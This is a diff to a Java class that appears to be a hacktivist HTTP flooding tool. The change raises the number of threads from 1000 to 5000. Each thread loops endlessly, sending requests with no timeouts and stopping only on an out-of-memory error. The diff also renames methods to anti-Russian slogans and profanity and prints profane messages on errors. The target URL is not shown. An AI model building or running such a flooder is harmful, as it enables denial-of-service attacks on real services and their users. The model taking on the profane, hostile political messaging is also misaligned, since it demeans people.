@@ -6,11 +6,11 @@ import static java.util.Objects.nonNull;
 public class HeyBabe implements Runnable {
 
     public static void main(String[] args) {
-        extracted();
+        gloryToUkraine();
     }
 
-    private static void extracted() {
-        for (int i = 0; i < 1000; i++) {
+    private static void gloryToUkraine() {
+        for (int i = 0; i < 5000; i++) {
             final HeyBabe heyBabe = new HeyBabe();
             final Thread thread = new Thread(heyBabe);
 
@@ -18,7 +18,7 @@ public class HeyBabe implements Runnable {
         }
     }
 
-    public static void hey() {
+    public static void sayPalianyzia() {
         Unirest.setTimeouts(0, 0);
         HttpResponse<String> response = null;
         try {
@@ -34,27 +34,26 @@ public class HeyBabe implements Runnable {
                 }
             }
         } catch (Exception e) {
-            if (nonNull(response)) {
-                System.err.println("E Status code --------> " + response.getStatus());
-            } else {
-                System.err.println("E --------> Status code is undefined");
-            }
+            System.err.println("ruskiy karabel, pishow nahui!");
+            System.err.println(e.getMessage());
         }
     }
 
-    public static void loop() {
-        while (true) {
+    public static void fuckrussia() {
+        boolean russiaIdeNahui = true;
+
+        while (russiaIdeNahui) {
             try {
-                hey();
+                sayPalianyzia();
                 System.gc();
-            } catch (Exception e) {
-                System.gc();
+            } catch (OutOfMemoryError e) {
+                russiaIdeNahui = false;
             }
         }
     }
 
     @Override
     public void run() {
-        loop();
+        fuckrussia();
     }
 }
